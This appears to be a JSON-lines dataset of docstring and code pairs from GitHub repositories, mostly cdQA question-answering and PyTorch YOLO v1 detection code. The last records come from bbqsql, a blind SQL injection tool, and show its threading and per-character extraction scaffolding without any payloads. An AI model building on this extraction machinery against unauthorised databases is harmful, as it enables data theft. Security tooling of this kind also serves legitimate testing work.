{"docstring": "\"\"\"Check if this is the 'max context' doc span for the token.\"\"\"\n\n# Because of the sliding window approach taken to scoring documents, a single\n# token can appear in multiple documents. E.g.\n#  Doc: the man went to the store and bought a gallon of milk\n#  Span A: the man went to the\n#  Span B: to the store and bought\n#  Span C: and bought a gallon of\n#  ...\n#\n# Now the word 'bought' will have two scores from spans B and C. We only\n# want to consider the score with \"maximum context\", which we define as\n# the *minimum* of its left and right context (the *sum* of left and\n# right context will always be the same, of course).\n#\n# In the example the maximum context for 'bought' would be span C since\n# it has 1 left context and 3 right context, while span B has 4 left context\n# and 0 right context.\n", "func_signal": "def _check_is_max_context(doc_spans, cur_span_index, position):\n", "code": "best_score = None\nbest_span_index = None\nfor (span_index, doc_span) in enumerate(doc_spans):\n    end = doc_span.start + doc_span.length - 1\n    if position < doc_span.start:\n        continue\n    if position > end:\n        continue\n    num_left_context = position - doc_span.start\n    num_right_context = end - position\n    score = min(num_left_context, num_right_context) + 0.01 * doc_span.length\n    if best_score is None or score > best_score:\n        best_score = score\n        best_span_index = span_index\n\nreturn cur_span_index == best_span_index", "path": "cdqa\\reader\\bertqa_sklearn.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\" Send reader to GPU\n\"\"\"\n", "func_signal": "def cuda(self):\n", "code": "self.reader.model.cuda()\nself.reader.device = torch.device(\"cuda\")\nreturn self", "path": "cdqa\\pipeline\\cdqa_sklearn.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\" Create a schedule with a learning rate that decreases linearly after\nlinearly increasing during a warmup period.\n\"\"\"\n", "func_signal": "def get_linear_schedule_with_warmup(optimizer, num_warmup_steps, num_training_steps, last_epoch=-1):\n", "code": "def lr_lambda(current_step):\n    if current_step < num_warmup_steps:\n        return float(current_step) / float(max(1, num_warmup_steps))\n    return max(0.0, float(num_training_steps - current_step) / float(max(1, num_training_steps - num_warmup_steps)))\n\nreturn LambdaLR(optimizer, lr_lambda, last_epoch)", "path": "cdqa\\reader\\bertqa_sklearn.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\"Get the n-best logits from a list.\"\"\"\n", "func_signal": "def _get_best_indexes(logits, n_best_size):\n", "code": "index_and_score = sorted(enumerate(logits), key=lambda x: x[1], reverse=True)\n\nbest_indexes = []\nfor i in range(len(index_and_score)):\n    if i >= n_best_size:\n        break\n    best_indexes.append(index_and_score[i][0])\nreturn best_indexes", "path": "cdqa\\reader\\bertqa_sklearn.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\" Dump reader model to a .joblib object\n\"\"\"\n", "func_signal": "def dump_reader(self, filename):\n", "code": "self.cpu()\njoblib.dump(self.reader, filename)\nif torch.cuda.is_available():\n    self.cuda()", "path": "cdqa\\pipeline\\cdqa_sklearn.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\"\nCreates a SQuAD examples json object for a given question using outputs of retriever and document database.\n\nParameters\n----------\nquestion : [type]\n    [description]\nbest_idx_scores : [type]\n    [description]\nmetadata : [type]\n    [description]\n\nReturns\n-------\nsquad_examples: list\n    [description]\n\nExamples\n--------\n>>> from cdqa.utils.converters import generate_squad_examples\n>>> squad_examples = generate_squad_examples(question='Since when does the the Excellence Program of BNP Paribas exist?',\n                                     best_idx_scores=[(788, 1.2), (408, 0.4), (2419, 0.2)],\n                                     metadata=df)\n\n\"\"\"\n\n", "func_signal": "def generate_squad_examples(question, best_idx_scores, metadata, retrieve_by_doc):\n", "code": "squad_examples = []\n\nmetadata_sliced = metadata.loc[best_idx_scores.keys()]\n\nfor idx, row in metadata_sliced.iterrows():\n    temp = {\"title\": row[\"title\"], \"paragraphs\": []}\n\n    if retrieve_by_doc:\n        for paragraph in row[\"paragraphs\"]:\n            temp[\"paragraphs\"].append(\n                {\n                    \"context\": paragraph,\n                    \"qas\": [\n                        {\n                            \"answers\": [],\n                            \"question\": question,\n                            \"id\": str(uuid.uuid4()),\n                            \"retriever_score\": best_idx_scores[idx],\n                        }\n                    ],\n                }\n            )\n    else:\n        temp[\"paragraphs\"] = [\n            {\n                \"context\": row[\"content\"],\n                \"qas\": [\n                    {\n                        \"answers\": [],\n                        \"question\": question,\n                        \"id\": str(uuid.uuid4()),\n                        \"retriever_score\": best_idx_scores[idx],\n                    }\n                ],\n            }\n        ]\n\n    squad_examples.append(temp)\n\nreturn squad_examples", "path": "cdqa\\utils\\converters.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "'''\nd: dict {name, value}\n'''\n", "func_signal": "def plot_many(self, d):\n", "code": "for k, v in d.iteritems():\n    self.plot(k, v)", "path": "visualize.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "'''\nbboxes(tensor) [N,4]\nscores(tensor) [N,]\n'''\n", "func_signal": "def nms(bboxes,scores,threshold=0.5):\n", "code": "x1 = bboxes[:,0]\ny1 = bboxes[:,1]\nx2 = bboxes[:,2]\ny2 = bboxes[:,3]\nareas = (x2-x1) * (y2-y1)\n\n_,order = scores.sort(0,descending=True)\nkeep = []\nwhile order.numel() > 0:\n    i = order[0]\n    keep.append(i)\n\n    if order.numel() == 1:\n        break\n\n    xx1 = x1[order[1:]].clamp(min=x1[i])\n    yy1 = y1[order[1:]].clamp(min=y1[i])\n    xx2 = x2[order[1:]].clamp(max=x2[i])\n    yy2 = y2[order[1:]].clamp(max=y2[i])\n\n    w = (xx2-xx1).clamp(min=0)\n    h = (yy2-yy1).clamp(min=0)\n    inter = w*h\n\n    ovr = inter / (areas[i] + areas[order[1:]] - inter)\n    ids = (ovr<=threshold).nonzero().squeeze()\n    if ids.numel() == 0:\n        break\n    order = order[ids+1]\nreturn torch.LongTensor(keep)", "path": "predict.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "#\u56fa\u5b9a\u4f4f\u9ad8\u5ea6\uff0c\u4ee50.8-1.2\u4f38\u7f29\u5bbd\u5ea6\uff0c\u505a\u56fe\u50cf\u5f62\u53d8\n", "func_signal": "def randomScale(self,bgr,boxes):\n", "code": "if random.random() < 0.5:\n    scale = random.uniform(0.8,1.2)\n    height,width,c = bgr.shape\n    bgr = cv2.resize(bgr,(int(width*scale),height))\n    scale_tensor = torch.FloatTensor([[scale,1,scale,1]]).expand_as(boxes)\n    boxes = boxes * scale_tensor\n    return bgr,boxes\nreturn bgr,boxes", "path": "dataset.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "\"\"\" Parse a PASCAL VOC xml file \"\"\"\n", "func_signal": "def parse_rec(filename):\n", "code": "tree = ET.parse(filename)\nobjects = []\nfor obj in tree.findall('object'):\n    obj_struct = {}\n    difficult = int(obj.find('difficult').text)\n    if difficult == 1:\n        # print(filename)\n        continue\n    obj_struct['name'] = obj.find('name').text\n    #obj_struct['pose'] = obj.find('pose').text\n    #obj_struct['truncated'] = int(obj.find('truncated').text)\n    #obj_struct['difficult'] = int(obj.find('difficult').text)\n    bbox = obj.find('bndbox')\n    obj_struct['bbox'] = [int(float(bbox.find('xmin').text)),\n                          int(float(bbox.find('ymin').text)),\n                          int(float(bbox.find('xmax').text)),\n                          int(float(bbox.find('ymax').text))]\n    objects.append(obj_struct)\n\nreturn objects", "path": "xml_2_txt.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "'''\n**kwargs, dict option\n'''\n", "func_signal": "def __init__(self, env='main', **kwargs):\n", "code": "self.vis = visdom.Visdom(env=env)\nself.index = {}  # x, dict\nself.log_text = ''\nself.env = env", "path": "visualize.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "\"\"\"VGG 19-layer model (configuration 'E') with batch normalization\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg19_bn(pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['E'], batch_norm=True), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg19_bn']))\nreturn model", "path": "net.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "\"\"\"VGG 13-layer model (configuration \"B\")\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg13(pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['B']), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg13']))\nreturn model", "path": "net.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "\"\"\"VGG 16-layer model (configuration \"D\")\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg16(pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['D']), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg16']))\nreturn model", "path": "net.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "'''\npreds {'cat':[[image_id,confidence,x1,y1,x2,y2],...],'dog':[[],...]}\ntarget {(image_id,class):[[],]}\n'''\n", "func_signal": "def voc_eval(preds,target,VOC_CLASSES=VOC_CLASSES,threshold=0.5,use_07_metric=False,):\n", "code": "aps = []\nfor i,class_ in enumerate(VOC_CLASSES):\n    pred = preds[class_] #[[image_id,confidence,x1,y1,x2,y2],...]\n    if len(pred) == 0: #\u5982\u679c\u8fd9\u4e2a\u7c7b\u522b\u4e00\u4e2a\u90fd\u6ca1\u6709\u68c0\u6d4b\u5230\u7684\u5f02\u5e38\u60c5\u51b5\n        ap = -1\n        print('---class {} ap {}---'.format(class_,ap))\n        aps += [ap]\n        break\n    #print(pred)\n    image_ids = [x[0] for x in pred]\n    confidence = np.array([float(x[1]) for x in pred])\n    BB = np.array([x[2:] for x in pred])\n    # sort by confidence\n    sorted_ind = np.argsort(-confidence)\n    sorted_scores = np.sort(-confidence)\n    BB = BB[sorted_ind, :]\n    image_ids = [image_ids[x] for x in sorted_ind]\n\n    # go down dets and mark TPs and FPs\n    npos = 0.\n    for (key1,key2) in target:\n        if key2 == class_:\n            npos += len(target[(key1,key2)]) #\u7edf\u8ba1\u8fd9\u4e2a\u7c7b\u522b\u7684\u6b63\u6837\u672c\uff0c\u5728\u8fd9\u91cc\u7edf\u8ba1\u624d\u4e0d\u4f1a\u9057\u6f0f\n    nd = len(image_ids)\n    tp = np.zeros(nd)\n    fp = np.zeros(nd)\n    for d,image_id in enumerate(image_ids):\n        bb = BB[d] #\u9884\u6d4b\u6846\n        if (image_id,class_) in target:\n            BBGT = target[(image_id,class_)] #[[],]\n            for bbgt in BBGT:\n                # compute overlaps\n                # intersection\n                ixmin = np.maximum(bbgt[0], bb[0])\n                iymin = np.maximum(bbgt[1], bb[1])\n                ixmax = np.minimum(bbgt[2], bb[2])\n                iymax = np.minimum(bbgt[3], bb[3])\n                iw = np.maximum(ixmax - ixmin + 1., 0.)\n                ih = np.maximum(iymax - iymin + 1., 0.)\n                inters = iw * ih\n\n                union = (bb[2]-bb[0]+1.)*(bb[3]-bb[1]+1.) + (bbgt[2]-bbgt[0]+1.)*(bbgt[3]-bbgt[1]+1.) - inters\n                if union == 0:\n                    print(bb,bbgt)\n                \n                overlaps = inters/union\n                if overlaps > threshold:\n                    tp[d] = 1\n                    BBGT.remove(bbgt) #\u8fd9\u4e2a\u6846\u5df2\u7ecf\u5339\u914d\u5230\u4e86\uff0c\u4e0d\u80fd\u518d\u5339\u914d\n                    if len(BBGT) == 0:\n                        del target[(image_id,class_)] #\u5220\u9664\u6ca1\u6709box\u7684\u952e\u503c\n                    break\n            fp[d] = 1-tp[d]\n        else:\n            fp[d] = 1\n    fp = np.cumsum(fp)\n    tp = np.cumsum(tp)\n    rec = tp/float(npos)\n    prec = tp/np.maximum(tp + fp, np.finfo(np.float64).eps)\n    #print(rec,prec)\n    ap = voc_ap(rec, prec, use_07_metric)\n    print('---class {} ap {}---'.format(class_,ap))\n    aps += [ap]\nprint('---map {}---'.format(np.mean(aps)))", "path": "eval_voc.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "#\u5e73\u79fb\u53d8\u6362\n", "func_signal": "def randomShift(self,bgr,boxes,labels):\n", "code": "center = (boxes[:,2:]+boxes[:,:2])/2\nif random.random() <0.5:\n    height,width,c = bgr.shape\n    after_shfit_image = np.zeros((height,width,c),dtype=bgr.dtype)\n    after_shfit_image[:,:,:] = (104,117,123) #bgr\n    shift_x = random.uniform(-width*0.2,width*0.2)\n    shift_y = random.uniform(-height*0.2,height*0.2)\n    #print(bgr.shape,shift_x,shift_y)\n    #\u539f\u56fe\u50cf\u7684\u5e73\u79fb\n    if shift_x>=0 and shift_y>=0:\n        after_shfit_image[int(shift_y):,int(shift_x):,:] = bgr[:height-int(shift_y),:width-int(shift_x),:]\n    elif shift_x>=0 and shift_y<0:\n        after_shfit_image[:height+int(shift_y),int(shift_x):,:] = bgr[-int(shift_y):,:width-int(shift_x),:]\n    elif shift_x <0 and shift_y >=0:\n        after_shfit_image[int(shift_y):,:width+int(shift_x),:] = bgr[:height-int(shift_y),-int(shift_x):,:]\n    elif shift_x<0 and shift_y<0:\n        after_shfit_image[:height+int(shift_y),:width+int(shift_x),:] = bgr[-int(shift_y):,-int(shift_x):,:]\n\n    shift_xy = torch.FloatTensor([[int(shift_x),int(shift_y)]]).expand_as(center)\n    center = center + shift_xy\n    mask1 = (center[:,0] >0) & (center[:,0] < width)\n    mask2 = (center[:,1] >0) & (center[:,1] < height)\n    mask = (mask1 & mask2).view(-1,1)\n    boxes_in = boxes[mask.expand_as(boxes)].view(-1,4)\n    if len(boxes_in) == 0:\n        return bgr,boxes,labels\n    box_shift = torch.FloatTensor([[int(shift_x),int(shift_y),int(shift_x),int(shift_y)]]).expand_as(boxes_in)\n    boxes_in = boxes_in+box_shift\n    labels_in = labels[mask.view(-1)]\n    return after_shfit_image,boxes_in,labels_in\nreturn bgr,boxes,labels", "path": "dataset.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "\"\"\"VGG 19-layer model (configuration \"E\")\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg19(pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['E']), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg19']))\nreturn model", "path": "net.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "'''\npred_tensor: (tensor) size(batchsize,S,S,Bx5+20=30) [x,y,w,h,c]\ntarget_tensor: (tensor) size(batchsize,S,S,30)\n'''\n", "func_signal": "def forward(self,pred_tensor,target_tensor):\n", "code": "N = pred_tensor.size()[0]\ncoo_mask = target_tensor[:,:,:,4] > 0\nnoo_mask = target_tensor[:,:,:,4] == 0\ncoo_mask = coo_mask.unsqueeze(-1).expand_as(target_tensor)\nnoo_mask = noo_mask.unsqueeze(-1).expand_as(target_tensor)\n\ncoo_pred = pred_tensor[coo_mask].view(-1,30)\nbox_pred = coo_pred[:,:10].contiguous().view(-1,5) #box[x1,y1,w1,h1,c1]\nclass_pred = coo_pred[:,10:]                       #[x2,y2,w2,h2,c2]\n\ncoo_target = target_tensor[coo_mask].view(-1,30)\nbox_target = coo_target[:,:10].contiguous().view(-1,5)\nclass_target = coo_target[:,10:]\n\n# compute not contain obj loss\nnoo_pred = pred_tensor[noo_mask].view(-1,30)\nnoo_target = target_tensor[noo_mask].view(-1,30)\nnoo_pred_mask = torch.cuda.ByteTensor(noo_pred.size())\nnoo_pred_mask.zero_()\nnoo_pred_mask[:,4]=1;noo_pred_mask[:,9]=1\nnoo_pred_c = noo_pred[noo_pred_mask] #noo pred\u53ea\u9700\u8981\u8ba1\u7b97 c \u7684\u635f\u5931 size[-1,2]\nnoo_target_c = noo_target[noo_pred_mask]\nnooobj_loss = F.mse_loss(noo_pred_c,noo_target_c,size_average=False)\n\n#compute contain obj loss\ncoo_response_mask = torch.cuda.ByteTensor(box_target.size())\ncoo_response_mask.zero_()\ncoo_not_response_mask = torch.cuda.ByteTensor(box_target.size())\ncoo_not_response_mask.zero_()\nbox_target_iou = torch.zeros(box_target.size()).cuda()\nfor i in range(0,box_target.size()[0],2): #choose the best iou box\n    box1 = box_pred[i:i+2]\n    box1_xyxy = Variable(torch.FloatTensor(box1.size()))\n    box1_xyxy[:,:2] = box1[:,:2]/14. -0.5*box1[:,2:4]\n    box1_xyxy[:,2:4] = box1[:,:2]/14. +0.5*box1[:,2:4]\n    box2 = box_target[i].view(-1,5)\n    box2_xyxy = Variable(torch.FloatTensor(box2.size()))\n    box2_xyxy[:,:2] = box2[:,:2]/14. -0.5*box2[:,2:4]\n    box2_xyxy[:,2:4] = box2[:,:2]/14. +0.5*box2[:,2:4]\n    iou = self.compute_iou(box1_xyxy[:,:4],box2_xyxy[:,:4]) #[2,1]\n    max_iou,max_index = iou.max(0)\n    max_index = max_index.data.cuda()\n    \n    coo_response_mask[i+max_index]=1\n    coo_not_response_mask[i+1-max_index]=1\n\n    #####\n    # we want the confidence score to equal the\n    # intersection over union (IOU) between the predicted box\n    # and the ground truth\n    #####\n    box_target_iou[i+max_index,torch.LongTensor([4]).cuda()] = (max_iou).data.cuda()\nbox_target_iou = Variable(box_target_iou).cuda()\n#1.response loss\nbox_pred_response = box_pred[coo_response_mask].view(-1,5)\nbox_target_response_iou = box_target_iou[coo_response_mask].view(-1,5)\nbox_target_response = box_target[coo_response_mask].view(-1,5)\ncontain_loss = F.mse_loss(box_pred_response[:,4],box_target_response_iou[:,4],size_average=False)\nloc_loss = F.mse_loss(box_pred_response[:,:2],box_target_response[:,:2],size_average=False) + F.mse_loss(torch.sqrt(box_pred_response[:,2:4]),torch.sqrt(box_target_response[:,2:4]),size_average=False)\n#2.not response loss\nbox_pred_not_response = box_pred[coo_not_response_mask].view(-1,5)\nbox_target_not_response = box_target[coo_not_response_mask].view(-1,5)\nbox_target_not_response[:,4]= 0\n#not_contain_loss = F.mse_loss(box_pred_response[:,4],box_target_response[:,4],size_average=False)\n\n#I believe this bug is simply a typo\nnot_contain_loss = F.mse_loss(box_pred_not_response[:,4], box_target_not_response[:,4],size_average=False)\n\n#3.class loss\nclass_loss = F.mse_loss(class_pred,class_target,size_average=False)\n\nreturn (self.l_coord*loc_loss + 2*contain_loss + not_contain_loss + self.l_noobj*nooobj_loss + class_loss)/N", "path": "yoloLoss.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "\"\"\"VGG 13-layer model (configuration \"B\") with batch normalization\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg13_bn(pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['B'], batch_norm=True), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg13_bn']))\nreturn model", "path": "net.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "\"\"\"VGG 16-layer model (configuration \"D\") with batch normalization\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg16_bn(pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['D'], batch_norm=True), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg16_bn']))\nreturn model", "path": "net.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "\"\"\"VGG 11-layer model (configuration \"A\") with batch normalization\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg11_bn(pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['A'], batch_norm=True), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg11_bn']))\nreturn model", "path": "net.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "\"\"\"VGG 11-layer model (configuration \"A\")\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def vgg11(pretrained=False, **kwargs):\n", "code": "model = VGG(make_layers(cfg['A']), **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['vgg11']))\nreturn model", "path": "net.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "'''\nplot('loss', 1.00)\n'''\n", "func_signal": "def plot(self, name, y, **kwargs):\n", "code": "x = self.index.get(name, 0) # if none, return 0\nself.vis.line(Y=np.array([y]), X=np.array([x]),\n            win=name,\n            opts=dict(title=name),\n            update=None if x== 0 else 'append',\n            **kwargs)\nself.index[name] = x + 1", "path": "visualize.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "'''\nplot val loss and train loss in one figure\n'''\n", "func_signal": "def plot_train_val(self, loss_train=None, loss_val=None):\n", "code": "x = self.index.get('train_val', 0)\n\nif x == 0:\n    loss = loss_train if loss_train else loss_val\n    win_y = np.column_stack((loss, loss))\n    win_x = np.column_stack((x, x))\n    self.win = self.vis.line(Y=win_y, X=win_x, \n                        env=self.env)\n                        # opts=dict(\n                        #     title='train_test_loss',\n                        # ))\n    self.index['train_val'] = x + 1\n    return \n\nif loss_train != None:\n    self.vis.line(Y=np.array([loss_train]), X=np.array([x]),\n                win=self.win,\n                name='1',\n                update='append',\n                env=self.env)\n    self.index['train_val'] = x + 5\nelse:\n    self.vis.line(Y=np.array([loss_val]), X=np.array([x]),\n                win=self.win,\n                name='2',\n                update='append',\n                env=self.env)", "path": "visualize.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "'''\npred (tensor) 1x7x7x30\nreturn (tensor) box[[x1,y1,x2,y2]] label[...]\n'''\n", "func_signal": "def decoder(pred):\n", "code": "grid_num = 14\nboxes=[]\ncls_indexs=[]\nprobs = []\ncell_size = 1./grid_num\npred = pred.data\npred = pred.squeeze(0) #7x7x30\ncontain1 = pred[:,:,4].unsqueeze(2)\ncontain2 = pred[:,:,9].unsqueeze(2)\ncontain = torch.cat((contain1,contain2),2)\nmask1 = contain > 0.1 #\u5927\u4e8e\u9608\u503c\nmask2 = (contain==contain.max()) #we always select the best contain_prob what ever it>0.9\nmask = (mask1+mask2).gt(0)\n# min_score,min_index = torch.min(contain,2) #\u6bcf\u4e2acell\u53ea\u9009\u6700\u5927\u6982\u7387\u7684\u90a3\u4e2a\u9884\u6d4b\u6846\nfor i in range(grid_num):\n    for j in range(grid_num):\n        for b in range(2):\n            # index = min_index[i,j]\n            # mask[i,j,index] = 0\n            if mask[i,j,b] == 1:\n                #print(i,j,b)\n                box = pred[i,j,b*5:b*5+4]\n                contain_prob = torch.FloatTensor([pred[i,j,b*5+4]])\n                xy = torch.FloatTensor([j,i])*cell_size #cell\u5de6\u4e0a\u89d2  up left of cell\n                box[:2] = box[:2]*cell_size + xy # return cxcy relative to image\n                box_xy = torch.FloatTensor(box.size())#\u8f6c\u6362\u6210xy\u5f62\u5f0f    convert[cx,cy,w,h] to [x1,xy1,x2,y2]\n                box_xy[:2] = box[:2] - 0.5*box[2:]\n                box_xy[2:] = box[:2] + 0.5*box[2:]\n                max_prob,cls_index = torch.max(pred[i,j,10:],0)\n                if float((contain_prob*max_prob)[0]) > 0.1:\n                    boxes.append(box_xy.view(1,4))\n                    cls_indexs.append(cls_index)\n                    probs.append(contain_prob*max_prob)\nif len(boxes) ==0:\n    boxes = torch.zeros((1,4))\n    probs = torch.zeros(1)\n    cls_indexs = torch.zeros(1)\nelse:\n    boxes = torch.cat(boxes,0) #(n,4)\n    probs = torch.cat(probs,0) #(n,)\n    cls_indexs = torch.cat(cls_indexs,0) #(n,)\nkeep = nms(boxes,probs)\nreturn boxes[keep],cls_indexs[keep],probs[keep]", "path": "predict.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "'''\nboxes (tensor) [[x1,y1,x2,y2],[]]\nlabels (tensor) [...]\nreturn 7x7x30\n'''\n", "func_signal": "def encoder(self,boxes,labels):\n", "code": "grid_num = 14\ntarget = torch.zeros((grid_num,grid_num,30))\ncell_size = 1./grid_num\nwh = boxes[:,2:]-boxes[:,:2]\ncxcy = (boxes[:,2:]+boxes[:,:2])/2\nfor i in range(cxcy.size()[0]):\n    cxcy_sample = cxcy[i]\n    ij = (cxcy_sample/cell_size).ceil()-1 #\n    target[int(ij[1]),int(ij[0]),4] = 1\n    target[int(ij[1]),int(ij[0]),9] = 1\n    target[int(ij[1]),int(ij[0]),int(labels[i])+9] = 1\n    xy = ij*cell_size #\u5339\u914d\u5230\u7684\u7f51\u683c\u7684\u5de6\u4e0a\u89d2\u76f8\u5bf9\u5750\u6807\n    delta_xy = (cxcy_sample -xy)/cell_size\n    target[int(ij[1]),int(ij[0]),2:4] = wh[i]\n    target[int(ij[1]),int(ij[0]),:2] = delta_xy\n    target[int(ij[1]),int(ij[0]),7:9] = wh[i]\n    target[int(ij[1]),int(ij[0]),5:7] = delta_xy\nreturn target", "path": "dataset.py", "repo_name": "abeardear/pytorch-YOLO-v1", "stars": 555, "license": "mit", "language": "python", "size": 71880}
{"docstring": "'''\ncreates a Character object for us. this generator is useful just because it keeps track of the char_index\n'''\n", "func_signal": "def _character_generator(self,row_index):\n", "code": "char_index = 1\nrow_die_event = AsyncResult()\nwhile not self.shutting_down.is_set():\n    c = BlindCharacter(\\\n        row_index   = row_index,\\\n        char_index  = char_index,\\\n        queue       = self.q,\\\n        row_die     = row_die_event)\n    char_index += 1\n    #fire off the Character within our Pool.\n    self.character_pool.spawn(c.run)\n    yield c", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "'''\nlook at how many gevent \"threads\" are being used and add more rows to correct this\n'''\n\n# if they don't specify row_index we assume only one row\n", "func_signal": "def _add_rows(self):\n", "code": "if not self.query.has_option(\"row_index\"):\n    self.char_gens.append(self._character_generator(0))\n    self.results.append([])\n    self.need_more_rows = False\n    return True\n\n# figure out how many rows at a time we should start working on\nif self.row_len is not None:\n    rows_to_work_on = self.concurrency // self.row_len\nelse:\n    rows_to_work_on = self.concurrency\nrows_to_work_on = [rows_to_work_on,1][rows_to_work_on == 0]\n\nrow_index = 0\n\n# keep adding new rows until we dont need any more\nwhile self.need_more_rows:\n    working_rows = len(filter(lambda row: 'working' in row,self.results))\n    for row in range(rows_to_work_on - working_rows):\n        self.char_gens.append(self._character_generator(row_index))\n        self.results.append([])\n        row_index += 1\n\n    gevent.sleep(.3)\n    self.need_more_rows = not(len(self.results) and filter(lambda row: len(row) and row[0] == 'error',self.results))\n\n# delete any extra rows.\nwhile not self.shutting_down.is_set():\n    self.results_lock.acquire()\n    # delete any rows that shouldn't have been added in the first place\n    errored = filter(lambda ri: len(self.results[ri]) and self.results[ri][0] == 'error',range(len(self.results)))\n    if errored:\n        end = min(errored)\n        for ri in xrange(len(self.results)-1,end-1,-1):\n            del(self.results[ri])\n\n    self.results_lock.release()    \n    #if there aren't going to be any more rows in need of deletion we can stop this nonsense\n    if self.results and self.results[-1][0] == 'success':\n        break\n    gevent.sleep(.3)", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "'''\n    :row_index  - what row this character is a part of (for rendering our Query)\n    :char_index - what character in the row is this (for rendering our Query)\n    :queue      - what queue will we push to. this queue will receive tuples in the\n                  form of:\n                     item=(self.row_index,self.char_index,self.char_val,comparator,asr)\n    :row_die    - gevent.event.AsyncResult that gets fired when the row needs to die. the\n                  value passed to this ASR's set() should be the char_index in this row\n                  after which all Character()s need to kill themselves\n'''\n#row_die is an AsyncResult. We link our die method to and store the \n#event so the die method can know if it should die (based on char_index emmitted by row_die)\n", "func_signal": "def __init__(self,row_index,char_index,queue,row_die):\n", "code": "self.row_die = row_die\nself.row_die.rawlink(self._die_callback)\n#run_gl will store the greenlet running the run() method\nself.run_gl = None\nself.q = queue\n\nself.row_index = row_index\nself.char_index = char_index\nself.char_val = settings.CHARSET[0]\n\n#these flags are used in computing the __str__, __repr__, and __eq__\nself.error = False\nself.working = False\nself.done = False", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
